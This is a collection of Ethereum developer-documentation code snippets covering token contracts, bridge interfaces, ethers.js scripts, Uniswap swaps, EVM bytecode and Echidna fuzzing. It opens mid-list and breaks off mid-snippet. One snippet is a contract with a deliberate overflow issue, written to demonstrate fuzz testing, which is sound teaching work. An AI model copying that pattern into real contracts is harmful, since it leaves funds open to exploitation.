229769152,\n229894976, 230030272, 230162368, 230292416, 230424512, 230553152,\n230684864, 230816704, 230948416, 231079616, 231210944, 231342016,\n231472448, 231603776, 231733952, 231866176, 231996736, 232127296,\n232259392, 232388672, 232521664, 232652608, 232782272, 232914496,\n233043904, 233175616, 233306816, 233438528, 233569984, 233699776,\n233830592, 233962688, 234092224, 234221888, 234353984, 234485312,\n234618304, 234749888, 234880832, 235011776, 235142464, 235274048,\n235403456, 235535936, 235667392, 235797568, 235928768, 236057152,\n236190272, 236322752, 236453312, 236583616, 236715712, 236846528,\n236976448, 237108544, 237239104, 237371072, 237501632, 237630784,\n237764416, 237895232, 238026688, 238157632, 238286912, 238419392,\n238548032, 238681024, 238812608, 238941632, 239075008, 239206336,\n239335232, 239466944, 239599168, 239730496, 239861312, 239992384,\n240122816, 240254656, 240385856, 240516928, 240647872, 240779072,\n240909632, 241040704, 241171904, 241302848, 241433408, 241565248,\n241696192, 241825984, 241958848, 242088256, 242220224, 242352064,\n242481856, 242611648, 242744896, 242876224, 243005632, 243138496,\n243268672, 243400384, 243531712, 243662656, 243793856, 243924544,\n244054592, 244187072, 244316608, 244448704, 244580032, 244710976,\n244841536, 244972864, 245104448, 245233984, 245365312, 245497792,\n245628736, 245759936, 245889856, 246021056, 246152512, 246284224,\n246415168, 246545344, 246675904, 246808384, 246939584, 247070144,\n247199552, 247331648, 247463872, 247593536, 247726016, 247857088,\n247987648, 248116928, 248249536, 248380736, 248512064, 248643008,\n248773312, 248901056, 249036608, 249167552, 249298624, 249429184,\n249560512, 249692096, 249822784, 249954112, 250085312, 250215488,\n250345792, 250478528, 250608704, 250739264, 250870976, 251002816,\n251133632, 251263552, 251395136, 251523904, 251657792, 251789248,\n251919424, 252051392, 252182464, 252313408, 252444224, 252575552,\n252706624, 252836032, 252968512, 253099712, 253227584, 253361728,\n253493056, 253623488, 253754432, 253885504, 254017216, 254148032,\n254279488, 254410432, 254541376, 254672576, 254803264, 254933824,\n255065792, 255196736, 255326528, 255458752, 255589952, 255721408,\n255851072, 255983296, 256114624, 256244416, 256374208, 256507712,\n256636096, 256768832, 256900544, 257031616, 257162176, 257294272,\n257424448, 257555776, 257686976, 257818432, 257949632, 258079552,\n258211136, 258342464, 258473408, 258603712, 258734656, 258867008,\n258996544, 259127744, 259260224, 259391296, 259522112, 259651904,\n259784384, 259915328, 260045888, 260175424, 260308544, 260438336,\n260570944, 260700992, 260832448, 260963776, 261092672, 261226304,\n261356864, 261487936, 261619648, 261750592, 261879872, 262011968,\n262143424, 262274752, 262404416, 262537024, 262667968, 262799296,\n262928704, 263061184, 263191744, 263322944, 263454656, 263585216,\n263716672, 263847872, 263978944, 264108608, 264241088, 264371648,\n264501184, 264632768, 264764096, 264895936, 265024576, 265158464,\n265287488, 265418432, 265550528, 265681216, 265813312, 265943488,\n266075968, 266206144, 266337728, 266468032, 266600384, 266731072,\n266862272, 266993344, 267124288, 267255616, 267386432, 267516992,\n267648704, 267777728, 267910592, 268040512, 268172096, 268302784,\n268435264, 268566208, 268696256, 268828096, 268959296, 269090368,\n269221312, 269352256, 269482688, 269614784, 269745856, 269876416,\n270007616, 270139328, 270270272, 270401216, 270531904, 270663616,\n270791744, 270924736, 271056832, 271186112, 271317184, 271449536,\n271580992, 271711936, 271843136, 271973056, 272105408, 272236352,\n272367296, 272498368, 272629568, 272759488, 272891456, 273022784,\n273153856, 273284672, 273415616, 273547072, 273677632, 273808448,\n273937088, 274071488, 274200896, 274332992, 274463296, 274595392,\n274726208, 274857536, 274988992, 275118656, 275250496, 275382208,\n275513024, 275643968, 275775296, 275906368, 276037184, 276167872,\n276297664, 276429376, 276560576, 276692672, 276822976, 276955072,\n277085632, 277216832, 277347008, 277478848, 277609664, 277740992,\n277868608, 278002624, 278134336, 278265536, 278395328, 278526784,\n278657728, 278789824, 278921152, 279052096, 279182912, 279313088,\n279443776, 279576256, 279706048, 279838528, 279969728, 280099648,\n280230976, 280361408, 280493632, 280622528, 280755392, 280887104,\n281018176, 281147968, 281278912, 281411392, 281542592, 281673152,\n281803712, 281935552, 282066496, 282197312, 282329024, 282458816,\n282590272, 282720832, 282853184, 282983744, 283115072, 283246144,\n283377344, 283508416, 283639744, 283770304, 283901504, 284032576,\n284163136, 284294848, 284426176, 284556992, 284687296, 284819264,\n284950208, 285081536]\n```\n\n----------------------------------------\n\nTITLE: Checking Constraint Feasibility in Manticore\nDESCRIPTION: Example of how to add a constraint to a specific state and check if the state is still feasible with the added constraint.\n\nLANGUAGE: python\nCODE:\n```\nstate.constrain(symbolic_var != 65)\nif solver.check(state.constraints):\n    # starea este fezabilă\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Token System in Serpent on Ethereum\nDESCRIPTION: This code snippet demonstrates a fundamental implementation of a token system in Serpent programming language for Ethereum. It defines a send function that transfers token value between addresses after verifying the sender has sufficient balance. This represents the core functionality needed for any token or currency system on Ethereum.\n\nLANGUAGE: py\nCODE:\n```\ndef send(to, value):\n  if self.storage[msg.sender] >= value:\n    self.storage[msg.sender] = self.storage[msg.sender] - value\n    self.storage[to] = self.storage[to] + value\n```\n\n----------------------------------------\n\nTITLE: Função de leitura do cache em Solidity\nDESCRIPTION: Implementa a leitura de um valor do cache a partir de sua chave. Requer que a chave seja válida e esteja dentro dos limites do array de armazenamento.\n\nLANGUAGE: solidity\nCODE:\n```\n    function cacheRead(uint _key) public view returns (uint) {\n        require(_key <= key2val.length, \"Reading uninitialize cache entry\");\n        return key2val[_key-1];\n    }  // cacheRead\n```\n\n----------------------------------------\n\nTITLE: Implementing a Cached Entry Writing Function in Solidity\nDESCRIPTION: Defines a function that leverages parameter caching to write entries without directly declaring parameters in the function signature.\n\nLANGUAGE: solidity\nCODE:\n```\n    function writeEntryCached() external {\n        uint[] memory params = _readParams(2);\n        writeEntry(params[0], params[1]);\n    }    // writeEntryCached\n```\n\n----------------------------------------\n\nTITLE: Esempi di Password in Markdown\nDESCRIPTION: Confronto tra una password debole e una password forte, formattato in Markdown, per illustrare le buone pratiche di sicurezza delle password.\n\nLANGUAGE: markdown\nCODE:\n```\nEsempio di una password debole: CuteFluffyKittens!\n\nEsempio di una password sicura: ymv\\*azu.EAC8eyp8umf\n```\n\n----------------------------------------\n\nTITLE: Complete Smart Contract Interaction Script with Ethers.js\nDESCRIPTION: Full JavaScript script for interacting with an Ethereum smart contract. It reads the initial message, updates it with new content, and then reads the updated message to verify the change was successful.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nconst API_KEY = process.env.API_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\nconst CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS\n\nconst contract = require(\"../artifacts/contracts/HelloWorld.sol/HelloWorld.json\")\n\n// provider - Alchemy\nconst alchemyProvider = new ethers.providers.AlchemyProvider(\n  (network = \"goerli\"),\n  API_KEY\n)\n\n// signer - you\nconst signer = new ethers.Wallet(PRIVATE_KEY, alchemyProvider)\n\n// contract instance\nconst helloWorldContract = new ethers.Contract(\n  CONTRACT_ADDRESS,\n  contract.abi,\n  signer\n)\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n\n  console.log(\"Updating the message...\")\n  const tx = await helloWorldContract.update(\"this is the new message\")\n  await tx.wait()\n\n  const newMessage = await helloWorldContract.message()\n  console.log(\"The new message is: \" + newMessage)\n}\n\nmain()\n```\n\n----------------------------------------\n\nTITLE: Implementing the Mint Button Click Handler in React\nDESCRIPTION: The onMintPressed function that calls the mintNFT function with form data and updates the UI with the transaction status.\n\nLANGUAGE: javascript\nCODE:\n```\nconst onMintPressed = async () => {\n  const { status } = await mintNFT(url, name, description)\n  setStatus(status)\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing _transfer Function in Solidity ERC-20 Token Contract\nDESCRIPTION: Internal function that moves tokens from one address to another. It's called by transfer and transferFrom functions, ensures the sender and recipient are valid addresses, and maintains the atomic nature of transfers.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Moves tokens `amount` from `sender` to `recipient`.\n *\n * This is internal function is equivalent to {transfer}, and can be used to\n * e.g. implement automatic token fees, slashing mechanisms, etc.\n *\n * Emits a {Transfer} event.\n *\n * Requirements:\n *\n * - `sender` cannot be the zero address.\n * - `recipient` cannot be the zero address.\n * - `sender` must have a balance of at least `amount`.\n */\nfunction _transfer(address sender, address recipient, uint256 amount) internal virtual {\n```\n\n----------------------------------------\n\nTITLE: Rendering AI Agent Product Lists Using Custom Component\nDESCRIPTION: A component that displays lists of AI agent products across different categories including existing agents, chat-based wallet controls, and resources for deeper learning.\n\nLANGUAGE: jsx\nCODE:\n```\n<AiAgentProductLists list=\"ai-agents\" />\n```\n\nLANGUAGE: jsx\nCODE:\n```\n<AiAgentProductLists list=\"chat\" />\n```\n\nLANGUAGE: jsx\nCODE:\n```\n<AiAgentProductLists list=\"dive-deeper\" />\n```\n\n----------------------------------------\n\nTITLE: Checking Contract Recipient in safeTransferFrom for ERC-721\nDESCRIPTION: Verifies if the recipient address is a contract, and if so, calls onERC721Received to ensure the contract can properly handle ERC-721 tokens.\n\nLANGUAGE: python\nCODE:\n```\n    if _to.is_contract: # check if `_to` is a contract address\n```\n\n----------------------------------------\n\nTITLE: Querying ERC20 Smart Contract Balance in C# using Nethereum\nDESCRIPTION: Example code for querying an ERC20 token balance from a smart contract using Nethereum in C#. This demonstrates interacting with Ethereum smart contracts.\n\nLANGUAGE: C#\nCODE:\n```\n// Playground link: http://playground.nethereum.com/csharp/id/1005\n```\n\n----------------------------------------\n\nTITLE: ERC20DepositInitiated Event Parameters for Token Addresses\nDESCRIPTION: Defines the token address parameters for the ERC20DepositInitiated event. These parameters track the L1 and L2 token addresses involved in the cross-layer transfer.\n\nLANGUAGE: solidity\nCODE:\n```\n        address indexed _l1Token,\n        address indexed _l2Token,\n```\n\n----------------------------------------\n\nTITLE: Running Nethermind Execution Client with JSON-RPC\nDESCRIPTION: Command to start a Nethermind execution client on the Ethereum mainnet with data storage in a specified directory and JWT authentication for consensus client connections.\n\nLANGUAGE: sh\nCODE:\n```\nNethermind.Runner --config mainnet \\\n    --datadir /data/ethereum \\\n    --JsonRpc.JwtSecretFile=/path/to/jwtsecret\n```\n\n----------------------------------------\n\nTITLE: Setting Up Cache Test Contract in Solidity\nDESCRIPTION: Initial setup for the Cache test contract, creating a new instance of the Cache contract before each test using Foundry's setUp function.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract CacheTest is Test {\n    Cache cache;\n\n    function setUp() public {\n        cache = new Cache();\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing Safe Token Transfer in TransferHelper\nDESCRIPTION: Helper function for safely transferring ERC20 tokens that handles both revert cases and false returns consistently. Uses low-level calls with function selector 0xa9059cbb for the ERC20 transfer function.\n\nLANGUAGE: solidity\nCODE:\n```\n    function safeTransfer(\n        address token,\n        address to,\n        uint256 value\n    ) internal {\n        // bytes4(keccak256(bytes('transfer(address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));\n        require(\n            success && (data.length == 0 || abi.decode(data, (bool))),\n            'TransferHelper::safeTransfer: transfer failed'\n        );\n    }\n```\n\n----------------------------------------\n\nTITLE: Compiling Smart Contracts with Forge\nDESCRIPTION: Commands to navigate to the contracts directory and compile the smart contracts using Forge, a Foundry component.\n\nLANGUAGE: shell\nCODE:\n```\ncd packages/contracts\nforge build\ncd ../..\n```\n\n----------------------------------------\n\nTITLE: Implementing transferFrom Method in Vyper ERC-721\nDESCRIPTION: This method transfers NFT ownership from one address to another. It performs various checks including verifying the sender is authorized, the token exists, and the destination is not the zero address.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef transferFrom(_from: address, _to: address, _tokenId: uint256):\n    \"\"\"\n    @dev Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT.\n         Throws if `_from` is not the current owner.\n         Throws if `_to` is the zero address.\n         Throws if `_tokenId` is not a valid NFT.\n    @notice The caller is responsible to confirm that `_to` is capable of receiving NFTs or else\n            they maybe be permanently lost.\n    @param _from The current owner of the NFT.\n    @param _to The new owner.\n    @param _tokenId The NFT to transfer.\n    \"\"\"\n    self._transferFrom(_from, _to, _tokenId, msg.sender)\n```\n\n----------------------------------------\n\nTITLE: Implementing Internal transferFrom Helper for ERC-721 in Vyper\nDESCRIPTION: Internal function that handles token transfer logic, including permission checks, clearing approvals, updating ownership records, and emitting Transfer events.\n\nLANGUAGE: vyper\nCODE:\n```\n@internal\ndef _transferFrom(_from: address, _to: address, _tokenId: uint256, _sender: address):\n    \"\"\"\n    @dev Execute transfer of a NFT.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT. (NOTE: `msg.sender` not allowed in private function so pass `_sender`.)\n         Throws if `_to` is the zero address.\n         Throws if `_from` is not the current owner.\n         Throws if `_tokenId` is not a valid NFT.\n    \"\"\"\n    # Check requirements\n    assert self._isApprovedOrOwner(_sender, _tokenId)\n    # Throws if `_to` is the zero address\n    assert _to != ZERO_ADDRESS\n    # Clear approval. Throws if `_from` is not the current owner\n    self._clearApproval(_from, _tokenId)\n    # Remove NFT. Throws if `_tokenId` is not a valid NFT\n    self._removeTokenFrom(_from, _tokenId)\n    # Add NFT\n    self._addTokenTo(_to, _tokenId)\n    # Log the transfer\n    log Transfer(_from, _to, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Implementing Internal Helper Function for Cross-Domain Messaging in Solidity\nDESCRIPTION: The getCrossDomainMessenger internal function returns the ICrossDomainMessenger interface for the stored messenger address. It's designed as a function rather than direct variable access to allow child contracts to override the behavior.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**********************\n     * Internal Functions *\n     **********************/\n\n    /**\n     * Gets the messenger, usually from storage. This function is exposed in case a child contract\n     * needs to override.\n     * @return The address of the cross-domain messenger contract which should be used.\n     */\n    function getCrossDomainMessenger() internal virtual returns (ICrossDomainMessenger) {\n        return ICrossDomainMessenger(messenger);\n    }\n```\n\n----------------------------------------\n\nTITLE: Rendering Greeter Component UI\nDESCRIPTION: Renders the Greeter component UI, conditionally showing the current greeting when available and providing an input field and button for updating the greeting on the blockchain.\n\nLANGUAGE: tsx\nCODE:\n```\n  return (\n    <>\n      <h2>Greeter</h2>\n      {\n        !readResults.isError && !readResults.isLoading &&\n          <ShowGreeting greeting={readResults.data} />\n      }\n      <hr />\n      <input type=\"text\" \n        value={newGreeting}\n        onChange={greetingChange}\n      />\n      <button disabled={!workingTx.write}\n              onClick={workingTx.write}\n      >\n        Update greeting\n      </button>\n      <hr />\n      <ShowObject name=\"readResults\" object={readResults} />\n      <ShowObject name=\"preparedTx\" object={preparedTx} />\n      <ShowObject name=\"workingTx\" object={workingTx} />\n    </>\n  )\n}\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for ERC20 Token Implementation\nDESCRIPTION: Ethereum Virtual Machine bytecode for an ERC20 token implementation that handles token transfers, allowances, and balance management. The bytecode includes opcodes for memory manipulation, storage access, and error handling with appropriate revert messages for operations like safe math overflow checking.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\nMSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0xDC1 DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0xF1A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xEDF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xEC4 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xF0C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 SUB SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0xFAB JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP POP POP JUMP INVALID GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH21 0x72616E7366657220746F20746865207A65726F2061 PUSH5 0x6472657373 GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH2 0x7070 PUSH19 0x6F766520746F20746865207A65726F20616464 PUSH19 0x65737345524332303A207472616E7366657220 PUSH2 0x6D6F PUSH22 0x6E7420657863656564732062616C616E636545524332 ADDRESS GASPRICE KECCAK256 PUSH21 0x72616E7366657220616D6F756E7420657863656564 PUSH20 0x20616C6C6F77616E636545524332303A20747261 PUSH15 0x736665722066726F6D20746865207A PUSH6 0x726F20616464 PUSH19 0x65737345524332303A20617070726F76652066 PUSH19 0x6F6D20746865207A65726F2061646472657373 GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH5 0x6563726561 PUSH20 0x656420616C6C6F77616E63652062656C6F77207A PUSH6 0x726FA2646970 PUSH7 0x735822122081C8 BLOCKHASH CREATE DUP8 0xCE 0xF9 0x2F 0xEC 0xCB SUB STATICCALL 0xDC PUSH8 0x8B2708C331896EC5 NUMBER 0x2B 0x5D 0x4C PUSH8 0x5F27B6D3E664736F PUSH13 0x63430006020033000000000000\n```\n\n----------------------------------------\n\nTITLE: Getting Maximum Deposit Limit in ERC-4626 Vault\nDESCRIPTION: This method returns the maximum amount of assets that can be deposited in a single deposit call by the specified receiver address.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction maxDeposit(address receiver) public view returns (uint256 maxAssets)\n```\n\n----------------------------------------\n\nTITLE: Defining IL2StandardERC20 Interface for Optimism Bridge\nDESCRIPTION: Interface definition for L2 ERC-20 tokens that use the standard bridge. It extends IERC20 and IERC165 interfaces, adding functions for minting and burning tokens that can only be called by the bridge.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { IERC165 } from \"@openzeppelin/contracts/utils/introspection/IERC165.sol\";\n\ninterface IL2StandardERC20 is IERC20, IERC165 {\n    function l1Token() external returns (address);\n\n    function mint(address _to, uint256 _amount) external;\n\n    function burn(address _from, uint256 _amount) external;\n\n    event Mint(address indexed _account, uint256 _amount);\n    event Burn(address indexed _account, uint256 _amount);\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Gas Prices Paid to Ethereum Foundation\nDESCRIPTION: This SQL query examines transactions sent to the Ethereum Foundation's address, showing the gas prices paid and ETH sent over time. It converts gas prices to Gwei and ETH values to their standard units.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    block_time,\n    gas_price / 1e9 AS gas_price_gwei,\n    value / 1e18 AS eth_sent\nFROM ethereum.\"transactions\"\nWHERE \"to\" = '\\xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe'\nORDER BY block_time DESC\n```\n\n----------------------------------------\n\nTITLE: Rendering Information Banner with Transaction Cost Details in HTML/JSX\nDESCRIPTION: An information banner component that displays the current and future expected cost reductions for Ethereum transactions through various scaling solutions. The component includes a list of bullet points highlighting the progressive fee reductions from rollups, ZK-rollups, and upcoming Ethereum changes.\n\nLANGUAGE: html\nCODE:\n```\n<InfoBanner mb={8} title=\"Transaction costs\">\n  <ul style={{ marginBottom: 0 }}>\n    <li>Today's rollups are <strong>~5-20x</strong> cheaper than Ethereum layer 1</li>\n    <li>ZK-rollups will soon lower fees by <strong>~40-100x</strong></li>\n    <li>Upcoming changes to Ethereum will provide another <strong>~100-1000x</strong> of scaling</li>\n    <li style={{ marginBottom: 0 }}>Users should benefit from transactions <strong>costing less than $0.001</strong></li>\n  </ul>\n</InfoBanner>\n```\n\n----------------------------------------\n\nTITLE: Echidna Configuration for Gas Estimation\nDESCRIPTION: This YAML configuration enables gas estimation in Echidna to measure and report the gas consumption of transactions.\n\nLANGUAGE: yaml\nCODE:\n```\nestimateGas: true\n```\n\n----------------------------------------\n\nTITLE: Implementing Read Entry Function in Solidity\nDESCRIPTION: Declaration of the readEntry function which is a view function that doesn't require parameter caching because view functions don't consume gas on the EVM.\n\nLANGUAGE: solidity\nCODE:\n```\n    function readEntry(uint key) public view\n        returns (uint _value, address _writtenBy, uint _writtenAtBlock)\n```\n\n----------------------------------------\n\nTITLE: Implementing sendCrossDomainMessage Function for Cross-Layer Communication\nDESCRIPTION: Internal function that sends a message to an account on another domain through the CrossDomainMessenger. It handles the forwarding of messages between Ethereum L1 and Optimism L2 with appropriate gas parameters.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * Sends a message to an account on another domain\n     * @param _crossDomainTarget The intended recipient on the destination domain\n     * @param _message The data to send to the target (usually calldata to a function with\n     *  `onlyFromCrossDomainAccount()`)\n     * @param _gasLimit The gasLimit for the receipt of the message on the target domain.\n     */\n    function sendCrossDomainMessage(\n        address _crossDomainTarget,\n        uint32 _gasLimit,\n        bytes memory _message\n    ) internal {\n        // slither-disable-next-line reentrancy-events, reentrancy-benign\n        getCrossDomainMessenger().sendMessage(_crossDomainTarget, _message, _gasLimit);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Token Swap Loop Implementation for Fee-On-Transfer Tokens\nDESCRIPTION: Loop implementation for swapping tokens along a path with support for fee-on-transfer tokens. This implementation calculates the actual amount received after fees by checking balances before and after transfers.\n\nLANGUAGE: solidity\nCODE:\n```\nfor (uint i; i < path.length - 1; i++) {\n    (address input, address output) = (path[i], path[i + 1]);\n    (address token0,) = UniswapV2Library.sortTokens(input, output);\n    IUniswapV2Pair pair = IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output));\n    uint amountInput;\n    uint amountOutput;\n    { // scope to avoid stack too deep errors\n    (uint reserve0, uint reserve1,) = pair.getReserves();\n    (uint reserveInput, uint reserveOutput) = input == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n    amountInput = IERC20(input).balanceOf(address(pair)).sub(reserveInput);\n    amountOutput = UniswapV2Library.getAmountOut(amountInput, reserveInput, reserveOutput);\n    }\n```\n\n----------------------------------------\n\nTITLE: Basic Contract Interaction Setup in JavaScript\nDESCRIPTION: Initial code for the interact.js file that sets up environment variables required for interacting with the deployed contract.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nconst API_KEY = process.env.API_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\nconst CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS\n```\n\n----------------------------------------\n\nTITLE: Swap Parameter Preparation\nDESCRIPTION: Prepares the parameters needed for the swap by extracting the input and output tokens from the path, sorting them, and determining the expected output amount for this step in the path.\n\nLANGUAGE: solidity\nCODE:\n```\n            (address input, address output) = (path[i], path[i + 1]);\n            (address token0,) = UniswapV2Library.sortTokens(input, output);\n            uint amountOut = amounts[i + 1];\n```\n\n----------------------------------------\n\nTITLE: Executing Hook Before Token Transfer in ERC-20\nDESCRIPTION: This line calls the _beforeTokenTransfer hook, which allows derived contracts to execute custom logic before any token transfer occurs. It's a powerful extension point for implementing additional features without modifying the core transfer logic.\n\nLANGUAGE: solidity\nCODE:\n```\n_beforeTokenTransfer(sender, recipient, amount);\n```\n\n----------------------------------------\n\nTITLE: Including web3.js via CDN in HTML\nDESCRIPTION: How to include the web3.js library in a web page using a CDN like JSDeliver. This approach is suitable for simple web pages where you want to directly use web3.js without a build system.\n\nLANGUAGE: html\nCODE:\n```\n<script src=\"https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: Implementing connectWalletPressed Handler in React\nDESCRIPTION: This function serves as the event handler for the wallet connect button. It calls the imported connectWallet function and updates the component state with the resulting wallet address and status message.\n\nLANGUAGE: javascript\nCODE:\n```\nconst connectWalletPressed = async () => {\n  const walletResponse = await connectWallet()\n  setStatus(walletResponse.status)\n  setWallet(walletResponse.address)\n}\n```\n\n----------------------------------------\n\nTITLE: Contract Address Detection in Solidity\nDESCRIPTION: Internal view function that determines whether an address belongs to a contract by checking the code size at that address using inline assembly. Used to distinguish between user accounts and contract accounts.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction isContract(address account) internal view returns (bool) {\n    uint256 size;\n    // Currently there is no better way to check if there is a contract in an address\n    // than to check the size of the code at that address.\n    // Bunun nasıl çalıştığı hakkında daha fazla ayrıntı için\n    // bkz. https://ethereum.stackexchange.com/a/14016/36603.\n    // Serenity sürümünden önce bunu tekrar kontrol edin, \n    // çünkü o zaman tüm adresler sözleşme olacaktır.\n    // solium-disable-next-line security/no-inline-assembly\n    assembly {\n        size := extcodesize(account)\n    }\n    return size > 0;\n}\n```\n\n----------------------------------------\n\nTITLE: Token Minting Validation and Execution in ERC-721\nDESCRIPTION: This code completes the minting process by checking the recipient is valid, creating the token, and emitting the Transfer event with a zero address source to indicate minting.\n\nLANGUAGE: vyper\nCODE:\n```\n    # Throws if `_to` is zero address\n    assert _to != ZERO_ADDRESS\n    # Add NFT. Throws if `_tokenId` is owned by someone\n    self._addTokenTo(_to, _tokenId)\n    log Transfer(ZERO_ADDRESS, _to, _tokenId)\n    return True\n```\n\n----------------------------------------\n\nTITLE: IL1ERC20Bridge Interface with ERC20DepositInitiated Event Declaration\nDESCRIPTION: Defines the beginning of the IL1ERC20Bridge interface with the ERC20DepositInitiated event that is emitted when a token deposit from L1 to L2 is initiated. In Optimism's terminology, 'deposit' refers to transfers from L1 to L2.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @title IL1ERC20Bridge\n */\ninterface IL1ERC20Bridge {\n    /**********\n     * Events *\n     **********/\n\n    event ERC20DepositInitiated(\n```\n\n----------------------------------------\n\nTITLE: Incrementor Contract with Potential Overflow Issue\nDESCRIPTION: A Solidity contract that increments a counter and returns the difference. This contract will be used to demonstrate assertion testing with Echidna.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract Incrementor {\n  uint private counter = 2**200;\n\n  function inc(uint val) public returns (uint){\n    uint tmp = counter;\n    counter += val;\n    // tmp <= counter\n    return (counter - tmp);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: RETURN Opcode (F3) Implementation\nDESCRIPTION: The RETURN opcode (F3) terminates execution and returns data from memory to the caller. It takes offset and length parameters to specify which memory segment to return.\n\nLANGUAGE: solidity\nCODE:\n```\nreturn mem[ost:ost+len-1]\n```\n\n----------------------------------------\n\nTITLE: Analyzing the Empty _mod_ Function Modifier\nDESCRIPTION: This snippet shows the _mod_ function modifier used in the _f_ function, which appears suspicious but is actually harmless since it doesn't contain any functionality besides passing execution to the modified function.\n\nLANGUAGE: solidity\nCODE:\n```\n  modifier _mod_(address sender, address recipient, uint256 amount){\n    _;\n  